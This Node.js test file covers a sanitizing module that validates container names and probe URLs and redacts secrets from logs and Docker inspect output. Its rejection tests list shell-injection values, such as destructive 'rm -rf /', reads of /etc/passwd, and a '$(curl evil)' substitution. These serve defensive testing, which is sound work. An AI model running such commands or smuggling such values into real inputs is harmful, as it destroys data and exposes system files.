import { test } from 'node:test'
import assert from 'node:assert/strict'
import {
  validateContainer,
  validateProbeUrl,
  redactSecrets,
  redactDockerInspect,
  truncate,
  ValidationError,
} from '../src/sanitize.js'

test('validateContainer accepts normal names', () => {
  for (const ok of ['web', 'app-1', 'my_app.2', 'rootpilot-calib-deleted', 'a.b_c-d']) {
    assert.equal(validateContainer(ok), ok)
  }
})

test('validateContainer rejects shell-injection attempts', () => {
  const attacks = [
    'x; rm -rf /',
    'a && whoami',
    'a | cat /etc/passwd',
    'a`id`',
    'a$(id)',
    'a b',
    'a\nb',
    "a'b",
    'a"b',
    'a>b',
    '$PWD',
    '../etc',
    '',
  ]
  for (const bad of attacks) {
    assert.throws(() => validateContainer(bad), ValidationError, `should reject: ${JSON.stringify(bad)}`)
  }
})

test('validateContainer rejects non-strings and overlong names', () => {
  assert.throws(() => validateContainer(undefined), ValidationError)
  assert.throws(() => validateContainer(123 as unknown), ValidationError)
  assert.throws(() => validateContainer('a'.repeat(200)), ValidationError)
})

test('validateProbeUrl accepts http(s) urls and rejects junk', () => {
  assert.equal(validateProbeUrl('https://cloudflare.com'), 'https://cloudflare.com')
  assert.equal(validateProbeUrl('http://example.com/path'), 'http://example.com/path')
  assert.throws(() => validateProbeUrl('cloudflare.com; rm -rf /'), ValidationError)
  assert.throws(() => validateProbeUrl('$(curl evil)'), ValidationError)
  assert.throws(() => validateProbeUrl('ftp://x'), ValidationError)
})

test('redactSecrets scrubs common secret shapes', () => {
  const cases: Array<[string, string]> = [
    ['DB_PASSWORD=hunter2', '***REDACTED***'],
    ['API_KEY: abcdef12345', '***REDACTED***'],
    ['Authorization: Bearer abcdEFGH1234._~+/=', '***REDACTED***'],
    ['token=sk-ABCDEFGHIJKLMNOPQRSTUV', '***REDACTED***'],
    ['ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZ012345', '***REDACTED***'],
    ['postgres://user:secretpw@db:5432/app', '***:***@'],
  ]
  for (const [input, marker] of cases) {
    const out = redactSecrets(input)
    assert.ok(out.includes(marker), `expected ${marker} in redaction of "${input}", got "${out}"`)
  }
})

test('redactSecrets scrubs PEM private key blocks', () => {
  const pem =
    '-----BEGIN OPENSSH PRIVATE KEY-----\nabcd\nefgh\n-----END OPENSSH PRIVATE KEY-----'
  const out = redactSecrets(pem)
  assert.ok(!out.includes('abcd'))
  assert.ok(out.includes('***REDACTED-PRIVATE-KEY***'))
})

test('redactDockerInspect scrubs env secret values', () => {
  const inspect = '"Env": ["PATH=/usr/bin", "MYSQL_PASSWORD=topsecret", "APP_TOKEN=deadbeef"]'
  const out = redactDockerInspect(inspect)
  assert.ok(!out.includes('topsecret'))
  assert.ok(!out.includes('deadbeef'))
  assert.ok(out.includes('PATH=/usr/bin'), 'non-secret env should survive')
})

test('truncate keeps head and tail and marks the cut', () => {
  const big = 'A'.repeat(5000) + 'B'.repeat(5000) + 'C'.repeat(5000)
  const out = truncate(big, 1000)
  assert.ok(out.length < big.length)
  assert.ok(out.includes('truncated'))
  assert.ok(out.startsWith('A'))
  assert.ok(out.endsWith('C'))
})

test('truncate leaves short output untouched', () => {
  assert.equal(truncate('hello', 1000), 'hello')
})
